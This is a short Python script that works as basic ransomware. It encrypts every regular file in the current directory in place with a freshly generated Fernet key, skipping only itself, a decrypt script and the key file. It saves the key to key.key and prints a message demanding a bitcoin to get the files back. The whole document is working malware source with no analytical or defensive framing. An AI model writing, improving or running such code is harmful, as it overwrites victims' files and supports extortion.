import os
from cryptography.fernet import Fernet
from colorama import Fore,Style,init

#Autoresseting the coloring in the colorama
init(autoreset=True)

files = []

for file in os.listdir():
    if file == "main.py" or file == "decrypt.py" or file=="key.key":
        continue
    else:
        if os.path.isfile(file):
            files.append(file)


secret_key = Fernet.generate_key()

with open('key.key','wb') as thekey:
    thekey.write(secret_key)

for file in files:
    with open(file,'rb') as thefile:
        content = thefile.read()
        encrypted_content = Fernet(secret_key).encrypt(content)
    with open(file,'wb') as thefile:
        thefile.write(encrypted_content)
        
print(f"{Fore.RED}Your all the files has been encrypted!")
print(f"{Fore.BLUE}Pay me a bitcoin to get your files back!!")
